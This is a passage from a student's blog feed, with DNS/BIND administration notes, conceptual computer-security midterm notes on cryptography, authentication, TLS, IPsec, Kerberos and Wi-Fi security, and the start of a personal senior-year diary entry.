Tools</h3><ul><li><code>host</code>, <code>nslookup</code>, <code>dig</code>, <code>drill</code> (with DNSSEC support)</li></ul><h2 id="Advanced-DNS-Use-Cases"><a href="#Advanced-DNS-Use-Cases" class="headerlink" title="Advanced DNS Use Cases"></a>Advanced DNS Use Cases</h2><ul><li><strong>GeoDNS:</strong> Responds based on client geography.</li><li><strong>IDN (Internationalized Domain Name):</strong> Supports Unicode domains.</li><li><strong>Punycode:</strong> Encodes Unicode to ASCII (e.g., <code>xn--fsq.com</code>).</li><li><strong>Public DNS Providers:</strong> Google (8.8.8.8), Cloudflare (1.1.1.1), OpenDNS.</li></ul><hr><h1 id="BIND-Berkeley-Internet-Name-Domain-System"><a href="#BIND-Berkeley-Internet-Name-Domain-System" class="headerlink" title="BIND (Berkeley Internet Name Domain) System"></a>BIND (Berkeley Internet Name Domain) System</h1><h2 id="Key-Components"><a href="#Key-Components" class="headerlink" title="Key Components"></a>Key Components</h2><ul><li><code>named</code>: Main DNS daemon.</li><li><code>bind-tools</code>: Query tools like <code>dig</code>, <code>host</code>, <code>nslookup</code>.</li><li><code>rndc</code>: Remote control for <code>named</code>.</li><li>Resolver libraries (e.g., <code>res_query</code>).</li></ul><h2 id="Configuration-Files"><a href="#Configuration-Files" class="headerlink" title="Configuration Files"></a>Configuration Files</h2><h3 id="named-conf-Main-Config"><a href="#named-conf-Main-Config" class="headerlink" title="named.conf (Main Config)"></a>named.conf (Main Config)</h3><table><thead><tr><th>Directive</th><th>Purpose</th></tr></thead><tbody><tr><td><code>options</code></td><td>Global settings: recursion, forwarders…</td></tr><tr><td><code>zone</code></td><td>Declares zone authority</td></tr><tr><td><code>view</code></td><td>Split DNS support</td></tr><tr><td><code>acl</code></td><td>Access control</td></tr><tr><td><code>controls</code></td><td>Manages <code>rndc</code> access</td></tr><tr><td><code>logging</code></td><td>Log setup: channel + category</td></tr><tr><td><code>include</code></td><td>Import other config files</td></tr></tbody></table><h3 id="Zone-Data-Files"><a href="#Zone-Data-Files" class="headerlink" title="Zone Data Files"></a>Zone Data Files</h3><ul><li>Resource Record (RR) format: <code>[name] [ttl] [class] type data</code><ul><li>Common classes: <code>IN</code> (Internet), <code>CH</code>, <code>HS</code></li><li>Special characters:<ul><li><code>;</code> for comments</li><li><code>@</code> for current origin</li><li><code>()</code> for line wrap</li><li><code>*</code> as wildcard (in name only)</li></ul></li></ul></li></ul><h3 id="RR-Types"><a href="#RR-Types" class="headerlink" title="RR Types"></a>RR Types</h3><table><thead><tr><th>Type</th><th>Description</th></tr></thead><tbody><tr><td>SOA</td><td>Start of Authority, zone origin info</td></tr><tr><td>NS</td><td>Name Server</td></tr><tr><td>A&#x2F;AAAA</td><td>IPv4&#x2F;IPv6 mapping</td></tr><tr><td>PTR</td><td>Reverse mapping</td></tr><tr><td>MX</td><td>Mail exchanger</td></tr><tr><td>CNAME</td><td>Canonical (alias) name</td></tr><tr><td>TXT</td><td>Arbitrary text, often for SPF</td></tr><tr><td>SRV</td><td>Service locator</td></tr><tr><td>DNSSEC</td><td>DS, DNSKEY, RRSIG, NSEC&#x2F;NSEC3, CAA, etc.</td></tr></tbody></table><h3 id="Other-Concepts"><a href="#Other-Concepts" class="headerlink" title="Other Concepts"></a>Other Concepts</h3><ul><li><strong>Glue Record:</strong> Child NS’s IP in parent zone.</li><li><strong>Lame Delegation:</strong> NS fails to serve delegated domain.</li></ul><h2 id="rndc-Remote-DNS-Control"><a href="#rndc-Remote-DNS-Control" class="headerlink" title="rndc: Remote DNS Control"></a>rndc: Remote DNS Control</h2><ul><li>Commands: <code>reload</code>, <code>restart</code>, <code>status</code>, <code>dumpdb</code>, etc.</li></ul><h2 id="Zone-Update-and-Transfer"><a href="#Zone-Update-and-Transfer" class="headerlink" title="Zone Update and Transfer"></a>Zone Update and Transfer</h2><ul><li>After zone file edits, increase serial number and run <code>rndc reload</code>.</li><li>With <code>notify</code> enabled, slave gets notified.</li><li>Transfer types:<ul><li><strong>AXFR:</strong> Full zone.</li><li><strong>IXFR:</strong> Incremental.</li></ul></li></ul><h2 id="Dynamic-Updates"><a href="#Dynamic-Updates" class="headerlink" title="Dynamic Updates"></a>Dynamic Updates</h2><ul><li>Allows real-time changes (RFC 2136).</li><li>Update via <code>nsupdate</code> tool.</li><li>Access controlled by <code>allow-update</code> or policy settings.</li></ul><h2 id="Security-Measures"><a href="#Security-Measures" class="headerlink" title="Security Measures"></a>Security Measures</h2><ul><li><strong>TSIG:</strong> Symmetric signature for zone transfers.</li><li><strong>DNSSEC:</strong> Ensures authenticity and integrity via public key cryptography.</li><li><strong>Jail &#x2F; ACLs &#x2F; Permissions:</strong> OS-level hardening options.</li><li><strong>DoT:</strong> Can be enabled for encrypted queries.</li></ul><h2 id="Logging-and-Debugging"><a href="#Logging-and-Debugging" class="headerlink" title="Logging and Debugging"></a>Logging and Debugging</h2><ul><li>Use <code>logging</code> section to configure output.</li><li>Tools:<ul><li><code>named -d &lt;level&gt;</code></li><li><code>rndc trace</code></li></ul></li></ul><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TCP-IP-Protocol-Model-Four-Layer-Architecture&quot;&gt;&lt;a href=&quot;#TCP-IP-Protocol-Model-Four-Layer-Architecture&quot; class=&quot;headerlink&quot; title=&quot;TC</summary>
      
    
    
    
    <category term="資工" scheme="http://withoutdirection.github.io/categories/%E8%B3%87%E5%B7%A5/"/>
    
    
    <category term="NA" scheme="http://withoutdirection.github.io/tags/NA/"/>
    
    <category term="期中考" scheme="http://withoutdirection.github.io/tags/%E6%9C%9F%E4%B8%AD%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>電腦安全總整與實作期中筆記</title>
    <link href="http://withoutdirection.github.io/CSC-midterm/"/>
    <id>http://withoutdirection.github.io/CSC-midterm/</id>
    <published>2025-04-12T16:00:00.000Z</published>
    <updated>2025-04-19T14:07:48.146Z</updated>
    
    <content type="html"><![CDATA[<h1 id="電腦安全總整與實作期中筆記"><a href="#電腦安全總整與實作期中筆記" class="headerlink" title="電腦安全總整與實作期中筆記"></a>電腦安全總整與實作期中筆記</h1><h2 id="Chapter-1-Overview"><a href="#Chapter-1-Overview" class="headerlink" title="Chapter 1: Overview"></a>Chapter 1: Overview</h2><h3 id="Three-components-of-computer-security"><a href="#Three-components-of-computer-security" class="headerlink" title="Three components of computer security"></a>Three components of computer security</h3><ul><li>Confidentiality<ol><li>Information is not disclosed to <strong>unauthorized</strong> individuals</li><li>Individuals control or influence what information related to them may be collected and stored</li></ol></li><li>Integrity<ol><li>Information and programs are changed only in a specified and authorized manner</li></ol></li><li>Availability<ol><li>Systems work promptly and service is not denied to authorized users</li></ol></li></ul><h3 id="Threats-and-Attacks"><a href="#Threats-and-Attacks" class="headerlink" title="Threats and Attacks"></a>Threats and Attacks</h3><table><thead><tr><th>Threat Consequence</th><th>Attack Action</th><th>Example</th></tr></thead><tbody><tr><td>Unauthorized Disclosure<br>Threats to <em>confidentiality</em></td><td>1. Exposure<br>2. Interception(攔截)<br>3. Inference(推斷)<br>4. Intrusion</td><td>MITM attack(Intercepting messages)<br>Traffic Analysis(Inference)<br>Phishing Attack(Intrusion)</td></tr><tr><td>Deception<br>Threats to <em>integrity</em></td><td>1. Masquerade<br>2. Falsification<br>3. Repudiation</td><td>Spoofing(Masquerade)<br>Website Defacement(Falsification)<br>Non-repudiation(Repudiation)</td></tr><tr><td>Disruption<br>Threats to <em>availability</em></td><td>1. Incapacitation<br>2. Corruption<br>3. Obstruction</td><td>DDOS attack(Incapacitation)<br>Data Ransomware Attack(Corruption)<br>Jamming Signals (Obstruction)</td></tr><tr><td>Usurpation<br>Threats to <em>availability</em></td><td>1. Misappropriation<br>2. Misuse<br></td><td>Hijacking Network Sessions(Misappropriation)<br>Malware Misuse (Misuse)</td></tr></tbody></table><h3 id="Attack-trees"><a href="#Attack-trees" class="headerlink" title="Attack trees"></a>Attack trees</h3><ul><li>Attack trees<ul><li>Usage: <ul><li>To effectively exploit the info available on attack patterns</li><li>To identify the most vulnerable components of a system</li><li>To guide both the design of systems&#x2F;apps and countermeasures</li></ul></li><li>Components:<ul><li>Root node: the goal of the attack</li><li>Leaf nodes:  different ways to initiate an attack</li><li>Internode: either an AND-node or an OR-node</li></ul></li></ul></li></ul><hr><h2 id="Chapter-2-Cryptographic-Tools"><a href="#Chapter-2-Cryptographic-Tools" class="headerlink" title="Chapter 2: Cryptographic Tools"></a>Chapter 2: Cryptographic Tools</h2><h3 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h3><ul><li><p>DES (Data Encryption Standard): </p><ol><li>Symmetric-key algorithm</li><li>Operates on <em>64-bit</em> blocks with a 56-bit key.<code>Became vulnerable due to short key length.</code></li></ol></li><li><p>Triple DES (3DES): Enhancement of DES by applying DES encryption three times with either <strong>two or three different keys</strong></p></li><li><p>AES (Advanced Encryption Standard):</p><ol><li>Symmetric block cipher selected by NIST</li><li>Based on the Rijndael algorithm. </li><li><em>128-bit</em> blocks and <strong>key sizes of 128, 192, or 256 bits</strong>.</li></ol></li><li><p>ECB (Electronic Codebook) Mode: </p><ul><li>Each block is encrypted independently.</li><li>Fast but vulnerable to <strong>pattern leakage</strong>.</li></ul></li><li><p>CBC (Cipher Block Chaining) Mode:</p><ul><li>Each plaintext block is XORed with the previous ciphertext block before encryption.</li><li>More secure than ECB.</li></ul></li></ul><h3 id="Message-Authentication"><a href="#Message-Authentication" class="headerlink" title="Message Authentication"></a>Message Authentication</h3><ul><li>Message authentication:<ul><li>Separate function from message encryption: Message Authentication Code (MAC)<ul><li>MAC: Use a <strong>secret key</strong> to generate a small block of data</li><li>Drawback: Slow &amp; Expensive</li></ul></li><li>Hash function: Need no private key<ol><li>can be applied to a block of data of any size</li><li>produces a fixed-length output</li><li>𝐻(𝑥) is relatively easy to compute for any given</li><li><em>weak collision</em> resistant: For any given block 𝑥, it is computationally infeasible to find 𝑦 ≠ 𝑥 with 𝐻 𝑦 &#x3D; 𝐻(𝑥)</li><li><em>strong collision</em> resistant: It is computationally infeasible to find any pair (𝑥, 𝑦) such that 𝐻 𝑥 &#x3D; 𝐻(𝑦)</li></ol></li></ul></li></ul><h3 id="Public-Key-Cryptography"><a href="#Public-Key-Cryptography" class="headerlink" title="Public Key Cryptography"></a>Public Key Cryptography</h3><ul><li>Key Characteristics:<ol><li>The public key can be widely disclosed.</li><li>The private key must be kept secret by its owner.</li><li>These two keys are mathematically related.</li></ol></li><li>Applications of Public-Key Cryptography:<ol><li>Digital signatures</li><li>Public-key certificates</li><li>Symmetric key exchange using public-key encryption<ul><li>Diffie-Hellman key exchange(<em>But no authentication</em>)</li></ul></li><li>Digital envelopes</li></ol></li></ul><hr><h2 id="Chapter-3-User-Authentication"><a href="#Chapter-3-User-Authentication" class="headerlink" title="Chapter 3: User Authentication"></a>Chapter 3: User Authentication</h2><blockquote><p>RFC 4949 Def: The process of verifying an identity claimed by or for a system entity</p></blockquote><ol><li>Identification step: presenting an identifier to the security system</li><li>Verification step: presenting or generating authentication information that corroborates the binding between the entity and the identifier</li></ol><h3 id="Authentication-Methods"><a href="#Authentication-Methods" class="headerlink" title="Authentication Methods"></a>Authentication Methods</h3><ol><li>Something you know<ul><li>Passwords</li><li>Security questions</li><li>PINs</li></ul></li><li>Something you have<ul><li>Tokens</li><li>smart cards</li><li>student IDs</li><li>SIM cards.</li></ul></li><li>Something you are<ul><li>Fingerprints</li><li>Iris scans</li><li>Retina scans</li></ul></li><li>Something you do<ul><li>Voice recognition</li><li>Handwriting recognition</li></ul></li></ol><h3 id="Electronic-Authentication-Architecture"><a href="#Electronic-Authentication-Architecture" class="headerlink" title="Electronic Authentication Architecture"></a>Electronic Authentication Architecture</h3><ul><li>Roles: <ol><li>User: The entity that is being authenticated</li><li>Verifier: The entity that verifies the identity of the user</li><li>Registration Authority (RA): The entity that registers the user and issues the credentials</li><li>Credential Service Provider (CSP): Issues credentials (e.g., password, SIM key).</li><li>Relying Party: rovides access to the service based on verified identity.</li></ol></li><li>Mechanism:<br><img src="/./CSC-midterm/EA-auth.png" alt="E-Authentication Architecture Model"></li></ul><hr><h2 id="Chapter-4-Access-Control"><a href="#Chapter-4-Access-Control" class="headerlink" title="Chapter 4: Access Control"></a>Chapter 4: Access Control</h2><blockquote><p>RFC 4949 Def: Access control refers to mechanisms that enforce policies defining which users or processes (subjects) may access which resources (objects), and in what manner.</p></blockquote><h3 id="Consequences-of-Access-Control-Failures"><a href="#Consequences-of-Access-Control-Failures" class="headerlink" title="Consequences of Access Control Failures"></a>Consequences of Access Control Failures</h3><ul><li>Information disclosure (confidentiality breach)</li><li>Data modification or destruction (integrity breach)</li><li>Unauthorized actions like privilege escalation or executing admin-level tasks.</li></ul><h3 id="Access-Control-Policies"><a href="#Access-Control-Policies" class="headerlink" title="Access Control Policies"></a>Access Control Policies</h3><table><thead><tr><th>Policy</th><th>Key Feature</th><th>Strength</th><th>Used In</th></tr></thead><tbody><tr><td>DAC</td><td>User identity + permissions</td><td>Flexible, user-centric</td><td>Unix, Windows</td></tr><tr><td>MAC</td><td>Classification levels</td><td>High security, rigid</td><td>Military, Govt.</td></tr><tr><td>RBAC</td><td>Role assignments</td><td>Scalable, manageable</td><td>Enterprises</td></tr><tr><td>ABAC</td><td>Multi-attribute conditions</td><td>Granular, dynamic</td><td>Cloud, modern apps</td></tr></tbody></table><h3 id="Access-Control-Models"><a href="#Access-Control-Models" class="headerlink" title="Access Control Models"></a>Access Control Models</h3><table><thead><tr><th>Model</th><th>Focus</th><th>Pros</th><th>Cons</th></tr></thead><tbody><tr><td>Access Control Lists (ACLs)</td><td>Object-based</td><td>Easy to find who can access a resource</td><td>Hard to know what a user can access</td></tr><tr><td>Capability Lists (Tickets)</td><td>Subject-based</td><td>Easy to check what a user can access</td><td>Difficult to find all users with access to a resource</td></tr></tbody></table><hr><h2 id="Chapter-22-Internet-Security-Protocols-and-Standards"><a href="#Chapter-22-Internet-Security-Protocols-and-Standards" class="headerlink" title="Chapter 22:  Internet Security Protocols and Standards"></a>Chapter 22:  Internet Security Protocols and Standards</h2><h3 id="S-MIME-DKIM"><a href="#S-MIME-DKIM" class="headerlink" title="S&#x2F;MIME &amp; DKIM"></a>S&#x2F;MIME &amp; DKIM</h3><ul><li>S&#x2F;MIME (Secure&#x2F;Multipurpose Internet Mail Extensions)<ul><li>Provides <strong>end-to-end</strong> security for email messages</li><li>Provides the ability to sign and&#x2F;or encrypt e-mail messages</li><li>Functions:<ol><li>Enveloped data: Encrypts content and associated keys</li><li>Signed data: Encoded message + signature</li><li>Clear-signed data: Cleartext message + signature</li><li>Signed and enveloped data: Encrypted message + signature</li></ol></li><li>Process from MIME to S&#x2F;MIME:<ol><li>MIME message is created</li><li>MIME message is signed(<em>Digital signature</em>)</li><li>Signed MIME message is encrypted (Encrypted by one time session key)</li><li>Encrypted MIME message is sent</li><li>Recipient decrypts the message</li><li>Recipient verifies the signature</li></ol></li></ul></li><li>DKIM (DomainKeys Identified Mail)<ul><li>Provides a method for validating a domain name identity that is associated with a message through cryptographic authentication</li><li>Uses public key cryptography to sign and verify email messages</li><li>Process:<ol><li>Message send by <em>SMTP</em> to the <em>Message Submission Agent</em> (MSA) </li><li>MSA adds DKIM-Signature header field(<em>signature</em>)</li><li>MSA sends the message to the <em>Message Transfer Agent</em> (MTA) by SMTP</li><li>MTA sends the message to the recipient’s MTA</li><li>Recipient’s MTA sends the message to the <em>Message Delivery Agent</em> (MDA)</li><li>MDA queries the <strong>DNS</strong> for the DKIM public key</li><li>MDA verifies the DKIM-Signature header field</li><li>MDA delivers the message to the recipient’s mailbox</li></ol></li></ul></li></ul><h3 id="TLS-Transport-Layer"><a href="#TLS-Transport-Layer" class="headerlink" title="TLS Transport Layer"></a>TLS <code>Transport Layer</code></h3><ul><li>Layer: above the transport layer and below the application layer</li><li>TLS(Session):<ol><li>Protocol content:<ul><li>Handshake protocol</li><li>Application data protocol</li><li>Alert protocol</li><li>Change cipher spec protocol</li></ul></li><li>Record protocol(Below the <strong>In the application of 1.</strong>)<ul><li>Fragmentation</li><li>Integrity check</li><li>Authentication</li><li>Encryption</li></ul></li></ol></li><li>TLS process</li></ul><table><thead><tr><th>Protocol</th><th>Step</th><th>Sender</th><th>Description</th><th>Receiver</th></tr></thead><tbody><tr><td>TCP</td><td>1</td><td>Client</td><td>SYN</td><td>Server</td></tr><tr><td>TCP</td><td>2</td><td>Server</td><td>SYN ACK</td><td>Client</td></tr><tr><td>TCP</td><td>3</td><td>Client</td><td>ACK</td><td>Server</td></tr><tr><td>TLS</td><td>4</td><td>Client</td><td>ClientHello</td><td>Server</td></tr><tr><td>TLS</td><td>5</td><td>Server</td><td>ServerHello, Certificate*, ServerKeyExchange*, CertificateRequest*</td><td>Client</td></tr><tr><td>TLS</td><td>6</td><td>Server</td><td>ServerHelloDone</td><td>Client</td></tr><tr><td>TLS</td><td>7</td><td>Client</td><td>ClientKeyExchange</td><td>Server</td></tr><tr><td>TLS</td><td>8</td><td>Client</td><td>ChangeCipherSpec</td><td>Server</td></tr><tr><td>TLS</td><td>9</td><td>Client</td><td>Finished</td><td>Server</td></tr><tr><td>TLS</td><td>10</td><td>Server</td><td>ChangeCipherSpec</td><td>Client</td></tr><tr><td>TLS</td><td>11</td><td>Server</td><td>Finished</td><td>Client</td></tr><tr><td>TLS</td><td>12</td><td>Client</td><td>ApplicationData</td><td>Server</td></tr><tr><td>TLS</td><td>13</td><td>Server</td><td>ApplicationData</td><td>Client</td></tr></tbody></table><ul><li>TLS Record Protocol<br><img src="/./CSC-midterm/TLS_record.png" alt="TLS Record Protocol"></li></ul><h3 id="IPSec-Internet-Protocol-Security-Network-Layer"><a href="#IPSec-Internet-Protocol-Security-Network-Layer" class="headerlink" title="IPSec (Internet Protocol Security) Network Layer"></a>IPSec (Internet Protocol Security) <code>Network Layer</code></h3><ol><li>Transport Mode</li></ol><ul><li>Purpose: End-to-end protection between two hosts.</li><li>Protection Scope: Only the <strong>IP payload</strong> (e.g., TCP&#x2F;UDP) is encrypted&#x2F;authenticated.</li><li>Header: Original IP header is retained and not protected.</li><li>Use Case: Host-to-host communication, such as securing a client-server session.</li><li>Encapsulation Process:<ol><li>Application sends TCP&#x2F;UDP segment.</li><li>ESP trailer added (padding, padding length, next header).</li><li>ESP header prepended (Security Parameters Index (SPI), sequence number).</li><li>Authentication data (HMAC) appended.</li><li>IP header attached.</li></ol></li></ul><ol start="2"><li>Tunnel Mode</li></ol><ul><li>Purpose: Gateway-to-gateway or gateway-to-host communication (site-to-site VPN).</li><li>Protection Scope: Entire original IP packet, including the header.</li><li>Header: Original IP header encrypted; new IP header added for routing.</li><li>Use Case: Securing traffic between networks (e.g., office branches, VPN).</li><li>Encapsulation Process:<ol><li><strong>Entire IP packet</strong> is encapsulated (header + payload).</li><li>ESP trailer, ESP header, and authentication data are added.</li><li>A new IP header (for outer routing) is prepended.</li></ol></li></ul><ol start="3"><li><img src="/./CSC-midterm/IPsec_package.png" alt="IPSec package"></li></ol><h3 id="NAT-and-IPsec"><a href="#NAT-and-IPsec" class="headerlink" title="NAT and IPsec"></a>NAT and IPsec</h3><ul><li>Problem: NAT Incompatibility<ul><li>IPsec (specifically AH and ESP) breaks NAT functionality due to:<ul><li>ESP encrypts TCP&#x2F;UDP headers, hiding ports needed by NAT.</li><li>AH includes IP headers in integrity check, which NAT modifies.</li></ul></li></ul></li><li>Solution: NAT Traversal (NAT-T)<ul><li>Adds a UDP header (port 4500) between IP and ESP headers.</li><li>Enables NAT devices to track sessions using source&#x2F;destination ports.</li><li>Allows encrypted traffic to pass through NAT devices.</li></ul></li></ul><hr><h2 id="Chapter-23-Internet-Authentication-Applications"><a href="#Chapter-23-Internet-Authentication-Applications" class="headerlink" title="Chapter 23: Internet Authentication Applications"></a>Chapter 23: Internet Authentication Applications</h2><ol><li>Kerberos<ul><li>Network third-party authentication protocol</li><li>Using symmetric key cryptography</li><li>Components:<ol><li>Authentication Server (AS): Verifies user identity and issues a Ticket Granting Ticket (TGT).</li><li>Ticket Granting Server (TGS): Issues service tickets after validating TGTs.</li><li>Client: Requests access to services.</li><li>Application Server: Provides requested services</li></ol></li><li>Process:<ol><li>Client sends a request to AS for TGT(<em>Ticket-granting-key</em>).</li><li>AS verifies the client and sends TGT and session key.</li><li>Client sends TGT to TGS for a service ticket.</li><li>TGS verifies TGT and sends a service ticket and session key.</li><li>Client uses the service ticket to access the application server.</li></ol></li><li>Security:<table><thead><tr><th>Threat</th><th>Mitigation</th></tr></thead><tbody><tr><td>Password sniffing</td><td>Password is never transmitted.</td></tr><tr><td>Replay attacks</td><td>Use of timestamped authenticators(not reusable)</td></tr><tr><td>Ticket forgery</td><td>Tickets encrypted with trusted keys.</td></tr><tr><td>Impersonation</td><td>Requires knowledge of session&#x2F;password-derived key</td></tr></tbody></table></li><li>Interrealm authentication<br>  <img src="/./CSC-midterm/Kerberos_interrealm.png" alt="Kerberos Interrealm Authentication"></li></ul></li><li>X.509<ul><li>A certificate links a public key to an identity.</li><li>Digitally signed by a Certificate Authority (CA).</li><li>Ensures the authenticity and integrity of the public key.</li></ul></li><li>OAuth<ul><li>Open standard for access delegation.</li><li>Allows third-party applications to access user data without sharing credentials.</li><li>Uses tokens instead of passwords for authentication.</li><li>Components:<ol><li>Resource Owner: User granting access.</li><li>Client: Application requesting access.</li><li>Authorization Server: Issues access tokens.</li><li>Resource Server: Hosts the protected resources.</li></ol></li><li>Process:<ol><li>Client requests authorization from the resource owner.</li><li>Resource owner grants authorization and provides a code to the client.</li><li>Client exchanges the code for an access token from the authorization server.</li><li>Client uses the access token to access resources on the resource server.</li></ol></li></ul></li></ol><h2 id="Chapter-24-Wireless-Network-Security"><a href="#Chapter-24-Wireless-Network-Security" class="headerlink" title="Chapter 24: Wireless Network Security"></a>Chapter 24: Wireless Network Security</h2><h3 id="Key-Security-Risks-in-Wireless-Networks"><a href="#Key-Security-Risks-in-Wireless-Networks" class="headerlink" title="Key Security Risks in Wireless Networks:"></a>Key Security Risks in Wireless Networks:</h3><ul><li>Channel: Broadcast in nature, prone to eavesdropping and jamming.</li><li>Mobility: Devices are more portable, increasing attack vectors.</li><li>Resources: Mobile devices are resource-constrained.</li><li>Accessibility: Devices may be unattended or in hostile environments.</li></ul><h3 id="IEEE-802-11-Wireless-Terminologies"><a href="#IEEE-802-11-Wireless-Terminologies" class="headerlink" title="IEEE 802.11 Wireless Terminologies:"></a>IEEE 802.11 Wireless Terminologies:</h3><ul><li>Station (STA): Any device with 802.11-compliant MAC&#x2F;PHY.</li><li>Access Point (AP): Connects stations to a distribution system.</li><li>BSS (Basic Service Set): Stations coordinated by one AP.</li><li>ESS (Extended Service Set): Multiple BSSs + LAN connected via DS.</li><li>DS (Distribution System): Network interconnecting multiple APs.</li><li>MSDU &#x2F; MPDU &#x2F; PPDU: Data flow through MAC and PHY layers.</li></ul><h3 id="802-11-Services-Mobility"><a href="#802-11-Services-Mobility" class="headerlink" title="802.11 Services &amp; Mobility:"></a>802.11 Services &amp; Mobility:</h3><ul><li>Association: Establish STA-AP connection.</li><li>Reassociation: Transfer STA to a new AP.</li><li>Disassociation: End of association (AP or STA initiated).</li><li>Authentication: Verifies identity.</li><li>Deauthentication: Terminates authentication.</li><li>Integration: Enables connection to wired LANs.</li></ul><h3 id="Types-of-Mobility"><a href="#Types-of-Mobility" class="headerlink" title="Types of Mobility:"></a>Types of Mobility:</h3><ul><li>No transition: Within a single BSS.</li><li>BSS transition: Between APs in the same ESS.</li><li>ESS transition: Across different ESSs (SSID change).</li></ul><h3 id="WPA2-vs-WPA3-Security-Comparison"><a href="#WPA2-vs-WPA3-Security-Comparison" class="headerlink" title="WPA2 vs WPA3: Security Comparison"></a>WPA2 vs WPA3: Security Comparison</h3><table><thead><tr><th>Feature</th><th>WPA2</th><th>WPA3</th></tr></thead><tbody><tr><td><strong>Authentication</strong></td><td>PSK &#x2F; 802.1X</td><td>SAE &#x2F; 802.1X</td></tr><tr><td><strong>Offline Dictionary Protection</strong></td><td>Weak</td><td>Strong</td></tr><tr><td><strong>Forward Secrecy</strong></td><td>No</td><td>Yes</td></tr><tr><td><strong>Encryption</strong></td><td>AES-CCMP</td><td>AES-GCMP (optional)</td></tr><tr><td><strong>KRACK Protection</strong></td><td>Patch only</td><td>Built-in</td></tr><tr><td><strong>Device Compatibility</strong></td><td>Broad</td><td>New devices only</td></tr></tbody></table><h3 id="WPA3-SAE-Simultaneous-Authentication-of-Equals"><a href="#WPA3-SAE-Simultaneous-Authentication-of-Equals" class="headerlink" title="WPA3 SAE (Simultaneous Authentication of Equals):"></a>WPA3 SAE (Simultaneous Authentication of Equals):</h3><ul><li>Password never sent or derived directly.</li><li>Uses Dragonfly key exchange over elliptic curves.</li><li>Resistant to dictionary and KRACK attacks.</li><li>Ensures forward secrecy.</li></ul><h3 id="4-Way-Handshake-Process"><a href="#4-Way-Handshake-Process" class="headerlink" title="4-Way Handshake Process:"></a>4-Way Handshake Process:</h3><ol><li>AP → STA: ANonce</li><li>STA → AP: SNonce + MIC</li><li>AP → STA: GTK encrypted + MIC</li><li>STA → AP: Final confirmation + MIC</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;電腦安全總整與實作期中筆記&quot;&gt;&lt;a href=&quot;#電腦安全總整與實作期中筆記&quot; class=&quot;headerlink&quot; title=&quot;電腦安全總整與實作期中筆記&quot;&gt;&lt;/a&gt;電腦安全總整與實作期中筆記&lt;/h1&gt;&lt;h2 id=&quot;Chapter-1-Overview&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="資工" scheme="http://withoutdirection.github.io/categories/%E8%B3%87%E5%B7%A5/"/>
    
    
    <category term="電腦安全" scheme="http://withoutdirection.github.io/tags/%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8/"/>
    
    <category term="資工" scheme="http://withoutdirection.github.io/tags/%E8%B3%87%E5%B7%A5/"/>
    
  </entry>
  
  <entry>
    <title>交大資工-大四紀錄</title>
    <link href="http://withoutdirection.github.io/Record-of-senior-in-NYCU/"/>
    <id>http://withoutdirection.github.io/Record-of-senior-in-NYCU/</id>
    <published>2025-03-15T16:09:58.726Z</published>
    <updated>2025-06-06T08:13:44.798Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>對於自己的大學生活很沒有實感<br>以此記錄自己到底做了甚麼<br>也順便藉由設立一些目標來督促自己</p><hr><h1 id="第四周"><a href="#第四周" class="headerlink" title="第四周"></a>第四周</h1><p><code>第一周架好Hexo跟環境設定，結果拖了兩周才開始記錄zz</code></p><ol><li><p>課業</p> <details> <summary>作業開始爆炸</summary><ul><li>資料科學與程式實務<ul><li>Hw0 anouncement:  <ul><li>簡單資訊呈現</li></ul></li><li>Hw1 anouncement:<ul><li>PMF sampling and drafting</li><li>PDF sampling and drafting</li></ul></li></ul></li><li>電腦安全總整<ul><li>Hw1 in progress:<ul><li>MITM attack</li><li>TLS hijacking</li></ul></li><li>Cryptography tool slide:<ul><li>對稱訊息加密</li><li>公開金鑰加密</li><li>數位簽章</li><li>Hash function</li><li>DES AES history</li></ul></li><li>Internet security protocol slide:<ul><li>SSL&#x2F;TLS</li><li>S&#x2F;MIME</li><li>DKIM</li><li>IPSec</li></ul></li></ul></li><li>計算機網路管理<ul><li>Hw1 complete:<ul><li>Router setting</li><li>Agent setting</li></ul></li></ul></li><li>基因演算法與管理科學應用<ul><li>GA basic 01 complete:<ul><li>GA basic concept</li><li>GA basic code</li></ul></li></ul></li><li>資料庫管理</li><li>前端網頁系統開發概論<ul><li>Hw1 announcement<ul><li>basic HTML page generating concating with CSS</li><li>VM setting</li></ul></li></ul></li></ul> </details> </li><li><p>日常</p><ul><li><p>調酒</p><ul><li>蜂蠟洗(waxwashed)<br>  隔水加熱將蠟融掉後加入基酒等蠟析出<br>  <em>實測比例: 50g蜂蠟&#x2F;300ml基酒</em><br>  影響: 味道變得更溫和，尾段口感變厚<br>  測試: 以蜂蠟洗過的Beefeather 製作 Negroni，經測試後發現銜接Campari的味道較原來的不突兀</li></ul></li><li><p>自煮</p><ul><li>炒雞蛋麵<br>  將雞蛋麵、小白菜、豬梅花肉绰熟後滑蛋炒<br>  結果: 有點焦，考慮下次要麵煮半熟且油多一點</li></ul></li><li><p>家教</p><ul><li>進度: 期中考進度結束，準備開始複習</li><li>思考以實體桌遊方式給大家增加寫題目的熱情</li></ul></li></ul></li><li><p>目標</p><ul><li><input disabled="" type="checkbox"> 完成資料科學與程式實務Hw1，參與助教課</li><li><input disabled="" type="checkbox"> 完成前端網頁系統概論Hw1，聽完前幾周的Recording</li><li><input disabled="" type="checkbox"> 完成蜂蠟洗的威士忌，並加入第三風味作為女朋友的生日禮物</li><li><input disabled="" type="checkbox"> 想一下家教的桌遊要如何設計，並與家長討論</li></ul></li></ol><hr><h1 id="第五周"><a href="#第五周" class="headerlink" title="第五周"></a>第五周</h1><pre><code>&gt; 作業開始大爆炸</code></pre><ol><li><p>Review goal</p><ul><li><input checked="" disabled="" type="checkbox"> 完成資料科學與程式實務Hw1，參與助教課</li><li><input checked="" disabled="" type="checkbox"> 完成前端網頁系統概論Hw1，聽完前幾周的Recording(忘記這學期死線改成當周五，結果遲交)</li><li><input checked="" disabled="" type="checkbox"> 完成蜂蠟洗的威士忌，並加入第三風味(<em>最後用伯爵茶</em>)作為女朋友的生日禮物</li><li><input disabled="" type="checkbox"> 把家教當RPG遊戲計畫被家長打槍，中道崩殂</li></ul></li><li><p>課業   </p> <details> 